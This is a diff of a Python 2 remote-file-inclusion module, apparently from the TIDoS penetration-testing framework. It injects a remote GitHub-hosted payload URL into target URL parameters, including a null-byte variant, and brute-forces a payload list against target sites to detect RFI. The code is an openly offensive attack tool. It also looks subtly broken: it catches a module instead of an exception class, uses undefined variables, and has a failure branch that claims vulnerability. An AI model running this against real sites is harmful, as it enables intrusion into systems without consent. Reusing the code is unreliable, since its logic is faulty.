@@ -42,7 +42,7 @@ def cust0x00(web):
 	if str(web0).startswith('/'):
 		print GR+' [!] Your input has a "/" in the beginning,..'	
 		fof = raw_input(O+' [#] Do you mean root directory? (y/n) :> ')
-		if ((fof == 'y') or (fof == 'Y')):
+		if fof == 'y' or fof == 'Y':
 			pass
 		elif ((fof == 'n') or (fof == 'N')):
 			web0 = web0.replace('/','')
@@ -70,14 +70,14 @@ def test(web0, web):
 		print B+' [+] URL : '+C+web0x0
 		print G+' [+] Url successfully parsed!'
 		print GR+' [*] Trying basic fetch...'
-		payload = 'http://www.google.com'
+		payload = 'https://raw.githubusercontent.com/theInfectedDrake/TIDoS-Framework/master/files/payload-db/json_payloads.lst'
 		web000 = web0x0 + payload
 		time.sleep(0.5)
-		print C+' [+] Payload : http://www.google.com'
+		print C+' [+] Payload Url : '+payload
 		print GR+' [*] Fetching '+C+web000
 		om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
 		pm = str(om)
-		if (("I'm Feeling Lucky" in pm) and ('Google Search' in pm)):
+		if '''{"__class":"null","A":"B"}''' in str(pm) and '''{"toJSON":"while(1);"}''' in str(pm):
 			print G+' [+] Heuristics reveal that '+O+web00+G+' is vulnerable to Remote File Inclusion!'
 			time.sleep(0.5)
 			print O+' [*] Confirming the vulnerability...'
@@ -100,7 +100,7 @@ def test(web0, web):
 					web00 = str(web) + str(web0)
 				web0x0 = web00.split('=')[0]
 				web0x0 = web0x0 + '='
-				print O+' [!] Heuristics reveal that the page may not be vulnerable to RFI!'
+				print O+' [!] Heuristics reveal that the page may be vulnerable to RFI!'
 				print C+' [*] Trying null byte character injection...'
 				payload1 = 'https://google.com%00'
 				web000 = web0x0 + payload1
@@ -134,10 +134,10 @@ def test(web0, web):
 				web0x0 = web0x0 + '='
 				print O+' [!] Heuristics reveal that the page may not be vulnerable to RFI!'
 				print C+' [*] Trying null byte character injection...'
-				payload1 = 'https://google.com%00'
+				payload1 = payload_url+'%00'
 				web000 = web0x0 + payload1
 				time.sleep(0.5)
-				print C+' [+] Payload : http://www.google.com%00'
+				print C+' [+] Payload : '+B+payload1
 				print GR+' [*] Fetching '+C+web000
 				om = u' '.join(requests.get(web000).text).encode('utf-8').strip()
 				pm = str(om)
@@ -183,15 +183,24 @@ def brute0x00(web):
 		print GR+' [*] Starting bruteforce...'
 		time.sleep(0.7)
 		for pay in payloads:
-			web0x00 = web + pay
-			req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
-			c = str(req.status_code)
-			if c == '200' or c == '302' or c == '300':
-				print G+' [+] Possible RFi at : '+O+web0x00+G+' (200)'
-			elif c == '404':
-				print B+' [*] Checking dir : '+C+web0x00+R+' (404)'
-			else:
-				print O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')'
+			try:
+				pay = pay.replace('XXpathXX',payload_url)
+				web0x00 = web + pay
+				req = requests.get(web0x00, allow_redirects=False, timeout=7, verify = False)
+				c = str(req.status_code)
+				if c == '200' and payload_1 in req.text and payload_2 in req.text and payload_3 in req.text:
+					print G+' [+] Possible RFi at : '+O+web0x00+G+' (200)'
+				elif c == '404':
+					print B+' [*] Checking dir : '+C+web0x00+R+' (404)'
+				elif c == '302':
+					print B+' [*] Possible RFi : '+C+web0x00+GR+' (302)'
+				else:
+					print O+' [*] Interesting response : '+GR+web0x00+O+' ('+c+')'
+
+			except requests.exceptions:
+				print R+' [-] Exception Encountered!'
+				pass
+
     except Exception as e:
 	print R+' [-] Unexpected Exception Encountered!'
 	print R+' [-] Exception : '+str(e)
@@ -244,7 +253,7 @@ def rfi(web):
 	print R+'\n   ==========================================='
 	print R+'    R E M O T E   F I L E   I N C L U S I O N'
 	print R+'   ===========================================\n'
-	print C+'    Choose from the options:'
+	print C+'    Choose from the options:\n'
 	print B+'    [1] Custom Targetting'
 	print B+'    [2] Automated Scanning\n'
 
